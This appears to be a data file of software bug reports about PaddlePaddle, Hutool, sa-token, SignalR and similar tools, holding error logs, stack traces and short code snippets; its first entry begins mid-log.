GLOG_logtostderr=0 Thu Sep 6 17:32:25 2018[1,95]&lt;stderr&gt;:+ GLOG_log_dir=./log Thu Sep 6 17:32:25 2018[1,16]&lt;stderr&gt;:+ LD_LIBRARY_PATH=/usr/local/lib:./python27-gcc482/lib::/usr/local/openmpi/lib:/home/normandy/nma/tools/hadoop-client/hadoop/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhce/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhdfs:/home/normandy/nma/tools/hadoop-client/hadoop/../java6/jre/lib/amd64/server Thu Sep 6 17:32:25 2018[1,91]&lt;stderr&gt;:+ GLOG_logtostderr=0 Thu Sep 6 17:32:25 2018[1,91]&lt;stderr&gt;:+ GLOG_log_dir=./log Thu Sep 6 17:32:25 2018[1,147]&lt;stderr&gt;:++ export PYTHONPATH=:thirdparty/thirdparty Thu Sep 6 17:32:25 2018[1,147]&lt;stderr&gt;:++ PYTHONPATH=:thirdparty/thirdparty Thu Sep 6 17:32:25 2018[1,95]&lt;stderr&gt;:+ ./paddle_pserver2 --num_gradient_servers=150 --nics=xgbe0 --port=03538 --ports_num=1 --ports_num_for_sparse=1 --rdma_tcp=tcp --comment=paddle_cluster_job Thu Sep 6 17:32:25 2018[1,16]&lt;stderr&gt;:+ GLOG_logtostderr=0 Thu Sep 6 17:32:25 2018[1,91]&lt;stderr&gt;:+ ./paddle_pserver2 --num_gradient_servers=150 --nics=xgbe0 --port=03538 --ports_num=1 --ports_num_for_sparse=1 --rdma_tcp=tcp --comment=paddle_cluster_job Thu Sep 6 17:32:25 2018[1,147]&lt;stderr&gt;:++ export LD_LIBRARY_PATH=./python27-gcc482/lib::/usr/local/openmpi/lib:/home/normandy/nma/tools/hadoop-client/hadoop/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhce/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhdfs:/home/normandy/nma/tools/hadoop-client/hadoop/../java6/jre/lib/amd64/server Thu Sep 6 17:32:25 2018[1,147]&lt;stderr&gt;:++ LD_LIBRARY_PATH=./python27-gcc482/lib::/usr/local/openmpi/lib:/home/normandy/nma/tools/hadoop-client/hadoop/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhce/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhdfs:/home/normandy/nma/tools/hadoop-client/hadoop/../java6/jre/lib/amd64/server Thu Sep 6 17:32:25 2018[1,16]&lt;stderr&gt;:+ GLOG_log_dir=./log Thu Sep 6 17:32:25 2018[1,16]&lt;stderr&gt;:+ ./paddle_pserver2 --num_gradient_servers=150 --nics=xgbe0 --port=03538 --ports_num=1 --ports_num_for_sparse=1 --rdma_tcp=tcp --comment=paddle_cluster_job Thu Sep 6 17:32:25 2018[1,147]&lt;stderr&gt;:+ '[' -z tcp ']' Thu Sep 6 17:32:25 2018[1,147]&lt;stderr&gt;:+ export LD_LIBRARY_PATH=/usr/local/lib:./python27-gcc482/lib::/usr/local/openmpi/lib:/home/normandy/nma/tools/hadoop-client/hadoop/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhce/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhdfs:/home/normandy/nma/tools/hadoop-client/hadoop/../java6/jre/lib/amd64/server Thu Sep 6 17:32:25 2018[1,147]&lt;stderr&gt;:+ LD_LIBRARY_PATH=/usr/local/lib:./python27-gcc482/lib::/usr/local/openmpi/lib:/home/normandy/nma/tools/hadoop-client/hadoop/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhce/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhdfs:/home/normandy/nma/tools/hadoop-client/hadoop/../java6/jre/lib/amd64/server Thu Sep 6 17:32:25 2018[1,147]&lt;stderr&gt;:+ GLOG_logtostderr=0 Thu Sep 6 17:32:25 2018[1,147]&lt;stderr&gt;:+ GLOG_log_dir=./log Thu Sep 6 17:32:25 2018[1,147]&lt;stderr&gt;:+ ./paddle_pserver2 --num_gradient_servers=150 --nics=xgbe0 --port=03538 --ports_num=1 --ports_num_for_sparse=1 --rdma_tcp=tcp --comment=paddle_cluster_job -------------------------------------------------------------------------- mpirun noticed that process rank 140 with PID 363 on node 10.87.102.19 exited on signal 9 (Killed). --------------------------------------------------------------------------"
AJ-report 大屏设计 上传背景图片失败,环境信息 pigx版本: v4.5 是否修改包名: 否 提供详细 上传 F12 network 返回 toKen 已过期 搜索 并删除   <code>: Authorization:Object(re.f)() .//file/upload ==&gt; ./file/upload
金额转换问题,"应该是 贰仟肆佰贰拾壹元零角贰分   <code>: System.out.println(""------------------------------------------------------------------------------""); System.out.println(Convert.digitToChinese(2421.02)); System.out.println(""------------------------------------------------------------------------------""); ------------------------------------------------------------------------------ 贰仟肆佰贰拾壹元零贰角 ------------------------------------------------------------------------------"
vue3环境下signalR跨域报错,"Furion 版本号 v1.15.0 Web 项目类型 WebApi Mvc Razor Pages Blazor Server 根据在线文档，现在用axios已经不报跨域错误了，但是signalr还是会报跨域错误。 Access to XMLHttpRequest at 'https://10.235.48.119:5001/hubs/cardReader/negotiate' from origin 'http://localhost:8080' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'. The credentials mode of requests initiated by the XMLHttpRequest is controlled by the withCredentials attribute. 代码或代码仓库 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 在vue3环境下可以正常使用signalr   <code>: import ""../../node_modules/signalr/jquery.signalR.min.js""; const signalR = require(""@aspnet/signalr""); let connection = new signalR.HubConnectionBuilder() .withUrl(""https://10.235.48.119:5001/hubs/cardReader"") .build(); connection.start()"
文档错误,使用的JDK版本和Hutool版本 Http响应   <code>: HttpResoonse res = HttpRequest.post(url)..execute(); Console.log(res.getStatus());
Add `make clean` in docker/build.sh to avoid link problem among different environment,"There is no before now. https://github.com/PaddlePaddle/Paddle/blob/b47a2a01b12c9d2e01a9bc3fed46819d0efab456/paddle/scripts/docker/build.sh#L76-L83 The test order of teamcity is: 1. CPU(openblas), 2.CPU(mkl)+GPU Thus, #7827:Correct deps of threadpool encounter a multiple definition mistake when compiling static library libpaddle_fluid.a in the second CPU+GPU mode. The reason is that tensor_util.cu is a soft link to tensor_util.cc https://github.com/PaddlePaddle/Paddle/blob/878d2e919c5c15fabc659ed544da3b867272f0d2/paddle/framework/tensor_util.cu#L1   <code>: make clean make -j [22:21:24] libpaddle_fluid.a(tensor_generated_tensor_util.cu.o): In function `paddle::framework::HasInf(paddle::framework::Tensor const&amp;)': [22:21:24] tmpxft_00003645_00000000-4_tensor_util.compute_61.cudafe1.cpp:(.text+0x5c0): multiple definition of `paddle::framework::HasInf(paddle::framework::Tensor const&amp;)' [22:21:24] libpaddle_fluid.a(tensor_util.cc.o):tensor_util.cc:(.text+0x190): first defined here [22:21:24] libpaddle_fluid.a(tensor_generated_tensor_util.cu.o): In function `paddle::framework::HasNAN(paddle::framework::Tensor const&amp;)': [22:21:24] tmpxft_00003645_00000000-4_tensor_util.compute_61.cudafe1.cpp:(.text+0xf40): multiple definition of `paddle::framework::HasNAN(paddle::framework::Tensor const&amp;)' [22:21:24] libpaddle_fluid.a(tensor_util.cc.o):tensor_util.cc:(.text+0x430): first defined here [22:21:24] libpaddle_fluid.a(tensor_util.cc.o): In function `paddle::framework::Tensor::mutable_data(boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace&gt;, std::type_index)': [22:21:24] tensor_util.cc:(.text._ZN6paddle9framework6Tensor12mutable_dataEN5boost7variantINS_8platform9CUDAPlaceEJNS4_8CPUPlaceEEEESt10type_index[_ZN6paddle9framework6Tensor12mutable_dataEN5boost7variantINS_8platform9CUDAPlaceEJNS4_8CPUPlaceEEEESt10type_index]+0x2c3): undefined reference to `paddle::platform::is_cpu_place(boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace&gt; const&amp;)' [22:21:24] tensor_util.cc:(.text._ZN6paddle9framework6Tensor12mutable_dataEN5boost7variantINS_8platform9CUDAPlaceEJNS4_8CPUPlaceEEEESt10type_index[_ZN6paddle9framework6Tensor12mutable_dataEN5boost7variantINS_8platform9CUDAPlaceEJNS4_8CPUPlaceEEEESt10type_index]+0x2cf): undefined reference to `paddle::platform::is_gpu_place(boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace&gt; const&amp;)' [22:21:24] tensor_util.cc:(.text._ZN6paddle9framework6Tensor12mutable_dataEN5boost7variantINS_8platform9CUDAPlaceEJNS4_8CPUPlaceEEEESt10type_index[_ZN6paddle9framework6Tensor12mutable_dataEN5boost7variantINS_8platform9CUDAPlaceEJNS4_8CPUPlaceEEEESt10type_index]+0xa70): undefined reference to `paddle::platform::is_cpu_place(boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace&gt; const&amp;)' [22:21:24] libpaddle_fluid.a(tensor_util.cc.o): In function `bool paddle::framework::AnyVisitor&lt;paddle::framework::HasInfPredicate&gt;::operator()&lt;paddle::platform::CPUPlace&gt;(paddle::platform::CPUPlace const&amp;) const': [22:21:24] tensor_util.cc:(.text._ZNK6paddle9framework10AnyVisitorINS0_15HasInfPredicateEEclINS_8platform8CPUPlaceEEEbRKT_[_ZNK6paddle9framework10AnyVisitorINS0_15HasInfPredicateEEclINS_8platform8CPUPlaceEEEbRKT_]+0x766): undefined reference to `paddle::platform::DeviceContextPool::Get(boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace&gt; const&amp;)' [22:21:24] libpaddle_fluid.a(tensor_util.cc.o): In function `bool paddle::framework::AnyVisitor&lt;paddle::framework::HasNANPredicate&gt;::operator()&lt;paddle::platform::CPUPlace&gt;(paddle::platform::CPUPlace const&amp;) const': [22:21:24] tensor_util.cc:(.text._ZNK6paddle9framework10AnyVisitorINS0_15HasNANPredicateEEclINS_8platform8CPUPlaceEEEbRKT_[_ZNK6paddle9framework10AnyVisitorINS0_15HasNANPredicateEEclINS_8platform8CPUPlaceEEEbRKT_]+0x766): undefined reference to `paddle::platform::DeviceContextPool::Get(boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace&gt; const&amp;)'"
crud中cell为true时，switch控件视图不更新,"重现步骤： crud控件开启cell为true， 后端请求数据后赋值，整个列表赋值 当值为1时，switch控件还是灰色状态，但是打印数据已经是1了（其他input，select控件可以正常显示。switch采用的是字典值） 配置代码如下： 期望： 当赋值时，switch控件正常显示选中   <code>: { cell: true, width: 100, label: '开关', prop: 'switch', type: 'switch', value: 0, dataType: 'number', dicUrl: '/api/blade-system/dict/dictionary?code=true_false', // 这里拿回来的是 0/1，字符串类型 props: { label: """", value: ""dictKey"" }, },"
sa-token使用hutool-jwt的5.8.5存在json序列化BUG,sa-token版本：1.31.0 场景：sa-token从1.30.0升级到1.31.0后，在javabean里定义的属性在rabbitmq发送消息后序列化异常。 定义的javabean如下： 经过尝试将sa-token还原为1.30.0，就可以解决或者将hutool-jwt排除 后来发现是sa-token-jwt使用的hutool版本5.8.5存在SONObject#write无法递归的bug，导致项目本身使用的时候存在胡BUG。hutool在5.8.6已经进行了修复。   <code>: package com.xxx.cloud.common.domain.dto.xxxxx; import cn.hutool.json.JSONObject; import lombok.Data; import java.io.Serializable; @Data public class ActionLogRawDTO implements Serializable { private static final long serialVersionUID = 1L; /** * 携带用户ID参数 */ private Integer userId; /** * 携带用户角色参数 */ private Integer roleId; /** * 额外扩展参数 * cn.hutool.json.JSONObject */ private JSONObject requestParams=new JSONObject(); } &lt;dependency&gt; &lt;groupId&gt;cn.dev33&lt;/groupId&gt; &lt;artifactId&gt;sa-token-jwt&lt;/artifactId&gt; &lt;version&gt;${sa-token.version}&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-jwt&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt;
[论文复现]YOLOX单机多卡训练过程中报paddle.logical_not报错,"1）PaddlePaddle版本：2.1.2 2）GPU：CUDA 10.1 和CUDNN 7.6， 单机四卡 4）系统环境：Python 3.7, aistudio脚本任务环境 训练信息 1）单机4卡 2）显存每卡32 G +=======================================================================================+ | Distributed Envs Value | +---------------------------------------------------------------------------------------+ | PADDLE_TRAINER_ID 0 | | PADDLE_CURRENT_ENDPOINT 127.0.0.1:55001 | | PADDLE_TRAINERS_NUM 4 | | PADDLE_TRAINER_ENDPOINTS ... 0.1:41722,127.0.0.1:43990,127.0.0.1:49511| | PADDLE_RANK_IN_NODE 0 | | PADDLE_LOCAL_DEVICE_IDS 0 | | PADDLE_WORLD_DEVICE_IDS 0,1,2,3 | | FLAGS_selected_gpus 0 | | FLAGS_selected_accelerators 0 | +=======================================================================================+ 问题描述：YOLOX论文第8个epoch报错 在第8个epoch约90%迭代位置，运行paddle.logical_not报错，具体出错信息如下： 2021-08-29 10:01:09 | INFO | yolox.core.trainer:219 - epoch: 8/300, iter: 3280/3697, iter_time: 1.654s, data_time: 0.007s, total_loss: 8.3, iou_loss: 2.6, l1_loss: 0.0, conf_loss: 3.6, cls_loss: 2.1, lr: 6.248e-04, size: 608, ETA: 18 days, 9:44:49 Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. Error: /paddle/paddle/fluid/operators/bce_loss_op.cu:38 Assertion failed. Input is expected to be within the interval [0, 1], but recieved nan. 2021-08-29 10:01:15 | INFO | yolox.core.trainer:160 - Training of experiment is done and the best AP is 0.00 2021-08-29 10:01:15 | ERROR | main:80 - An error has been caught in function '', process 'MainProcess' (2251), thread 'MainThread' (139919071340288): Traceback (most recent call last): File ""tools/train.py"", line 80, in main() └ &lt;function main at 0x7f410094d2f0&gt; File ""tools/train.py"", line 76, in main trainer.train() │ └ &lt;function Trainer.train at 0x7f4100a11268&gt; └ &lt;yolox.core.trainer.Trainer object at 0x7f4116bb8da0&gt; File ""/root/paddlejob/workspace/code/yolox/core/trainer.py"", line 57, in train self.train_in_epoch() │ └ &lt;function Trainer.train_in_epoch at 0x7f4100a111e0&gt; └ &lt;yolox.core.trainer.Trainer object at 0x7f4116bb8da0&gt; File ""/root/paddlejob/workspace/code/yolox/core/trainer.py"", line 66, in train_in_epoch self.train_in_iter() │ └ &lt;function Trainer.train_in_iter at 0x7f4100a110d0&gt; └ &lt;yolox.core.trainer.Trainer object at 0x7f4116bb8da0&gt; File ""/root/paddlejob/workspace/code/yolox/core/trainer.py"", line 72, in train_in_iter self.train_one_iter(data) │ │ └ │ └ &lt;function Trainer.train_one_iter at 0x7f4100964268&gt; └ &lt;yolox.core.trainer.Trainer object at 0x7f4116bb8da0&gt; File ""/root/paddlejob/workspace/code/yolox/core/trainer.py"", line 85, in train_one_iter outputs = self.model(inps, targets) │ │ │ └ │ │ └ │ └ DataParallel( │ (_layers): YOLOX( │ (backbone): YOLOPAFPN( │ (backbone): CSPDarknet( │ (stem): Focus( │ (... └ &lt;yolox.core.trainer.Trainer object at 0x7f4116bb8da0&gt; File ""/opt/_internal/cpython-3.7.0/lib/python3.7/site-packages/paddle/fluid/dygraph/layers.py"", line 902, in call outputs = self.forward(*inputs, **kwargs) │ │ │ └ {} │ │ └ │ └ &lt;function DataParallel.forward at 0x7f4115101840&gt; └ DataParallel( (_layers): YOLOX( (backbone): YOLOPAFPN( (backbone): CSPDarknet( (stem): Focus( (... File ""/opt/_internal/cpython-3.7.0/lib/python3.7/site-packages/paddle/fluid/dygraph/parallel.py"", line 578, in forward outputs = self._layers(*inputs, **kwargs) │ │ └ {} │ └ └ DataParallel( (_layers): YOLOX( (backbone): YOLOPAFPN( (backbone): CSPDarknet( (stem): Focus( (... File ""/opt/_internal/cpython-3.7.0/lib/python3.7/site-packages/paddle/fluid/dygraph/layers.py"", line 902, in call outputs = self.forward(*inputs, **kwargs) │ │ │ └ {} │ │ └ │ └ &lt;function YOLOX.forward at 0x7f4116b8ca60&gt; └ YOLOX( (backbone): YOLOPAFPN( (backbone): CSPDarknet( (stem): Focus( (conv): BaseConv( (conv): ... File ""/root/paddlejob/workspace/code/yolox/models/yolox.py"", line 35, in forward fpn_outs, targets, x │ │ └ │ └ └ File ""/opt/_internal/cpython-3.7.0/lib/python3.7/site-packages/paddle/fluid/dygraph/layers.py"", line 902, in call outputs = self.forward(*inputs, **kwargs) │ │ │ └ {} │ │ └ │ └ &lt;function YOLOXHead.forward at 0x7f4116b8c1e0&gt; └ YOLOXHead( (cls_convs): ModuleList( (0): Sequential( (0): BaseConv( (conv): Conv2D(320, 320, kernel_size=... File ""/root/paddlejob/workspace/code/yolox/models/yolo_head.py"", line 229, in forward dtype=xin[0].dtype, └ File ""/root/paddlejob/workspace/code/yolox/models/yolo_head.py"", line 354, in get_losses imgs, └ File """", line 2, in get_assignments File ""/opt/_internal/cpython-3.7.0/lib/python3.7/site-packages/paddle/fluid/dygraph/base.py"", line 331, in _decorate_function return func(*args, **kwargs) │ │ └ {} │ └ └ &lt;function YOLOXHead.get_assignments at 0x7f4116b8c488&gt; File ""/root/paddlejob/workspace/code/yolox/models/yolo_head.py"", line 483, in get_assignments + 100000.0 * (paddle.cast(paddle.logical_not(is_in_boxes_and_center), paddle.float32)) │ │ │ │ │ │ └ paddle.float32 │ │ │ │ │ └ &lt;module 'paddle' from '/opt/_internal/cpython-3.7.0/lib/python3.7/site-packages/paddle/init.py'&gt; │ │ │ │ └ │ │ │ └ &lt;function logical_not at 0x7f4115152950&gt; │ │ └ &lt;module 'paddle' from '/opt/_internal/cpython-3.7.0/lib/python3.7/site-packages/paddle/init.py'&gt; │ └ &lt;function cast at 0x7f4115148598&gt; └ &lt;module 'paddle' from '/opt/_internal/cpython-3.7.0/lib/python3.7/site-packages/paddle/init.py'&gt; File ""/opt/_internal/cpython-3.7.0/lib/python3.7/site-packages/paddle/fluid/layers/nn.py"", line 12290, in logical_not op_name=""logical_not"", x=x, y=None, name=name, out=out, binary_op=False) │ │ └ None │ └ None └ File ""/opt/_internal/cpython-3.7.0/lib/python3.7/site-packages/paddle/fluid/layers/nn.py"", line 12120, in _logical_op return op(x) │ └ └ &lt;built-in method logical_not of PyCapsule object at 0x7f4161365390&gt; SystemError: (Fatal) Operator logical_not raises an thrust::system::system_error exception. The exception content is :transform: failed to synchronize: cudaErrorLaunchFailure: unspecified launch failure. (at /paddle/paddle/fluid/imperative/tracer.cc:192) C++ Traceback (most recent call last): INFO 2021-08-29 10:01:35,007 launch_utils.py:327] terminate all the procs ERROR 2021-08-29 10:01:35,008 launch_utils.py:584] ABORT!!! Out of all 4 trainers, the trainer process with rank=[0] was aborted. Please check its log. INFO 2021-08-29 10:01:38,011 launch_utils.py:327] terminate all the procs 0 paddle::memory::allocation::CUDADeviceContextAllocatorPool::~CUDADeviceContextAllocatorPool() 1 std::_Sp_counted_ptr&lt;paddle::memory::allocation::CUDADeviceContextAllocator*, (__gnu_cxx::_Lock_policy)2&gt;::_M_dispose() 2 paddle::memory::allocation::CUDADeviceContextAllocator::~CUDADeviceContextAllocator() 3 paddle::platform::build_nvidia_error_msgabi:cxx11 4 paddle::platform::proto::cudaerrorDesc::ByteSizeLong() const 5 paddle::platform::proto::AllMessageDesc::ByteSizeLong() const 6 paddle::platform::proto::MessageDesc::ByteSizeLong() const 7 paddle::framework::SignalHandle(char const*, int) 8 paddle::platform::GetCurrentTraceBackStringabi:cxx11 Error Message Summary: FatalError: is detected by the operating system. [TimeInfo: *** Aborted at 1630202490 (unix time) try ""date -d @1630202490"" if you are using GNU date ***] [SignalInfo: *** SIGSEGV (@0x8) received by PID 2251 (TID 0x7f41728b6700) from PID 8 ***] /mnt [INFO]: train job failed! train_ret: 1   <code>: (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= 